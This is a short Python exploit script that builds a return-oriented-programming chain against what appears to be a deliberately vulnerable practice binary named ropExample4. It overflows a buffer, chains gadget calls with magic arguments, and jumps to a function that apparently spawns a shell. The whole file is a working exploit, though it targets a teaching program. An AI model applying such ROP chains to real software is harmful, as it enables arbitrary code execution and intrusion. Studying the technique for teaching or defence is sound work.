#!/usr/bin/python

import os
import struct

# These values were found with `objdump -d a.out`.
# or via gdb disas add_bin or add_sh
pop_ret = 0x804851e # this is the starting address for ANY pop ret sequence
pop_pop_ret = 0x804851d # this is the starting address for ANY pop pop ret sequence
exec_string = 0x08048456
add_bin = 0x08048481
add_sh = 0x080484ce

# First, the buffer overflow.
payload =  "A"*0x6c
payload += "BBBB"

# The add_bin(0xdeadbeef) gadget.
payload += struct.pack("I", add_bin)
payload += struct.pack("I", pop_ret)
payload += struct.pack("I", 0xdeadbeef)

# The add_sh(0xcafebabe, 0x0badf00d) gadget.
payload += struct.pack("I", add_sh)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", 0xcafebabe)
payload += struct.pack("I", 0xbadf00d)

# Our final destination.
payload += struct.pack("I", exec_string)

os.system("./ropExample4 \"%s\"" % payload)
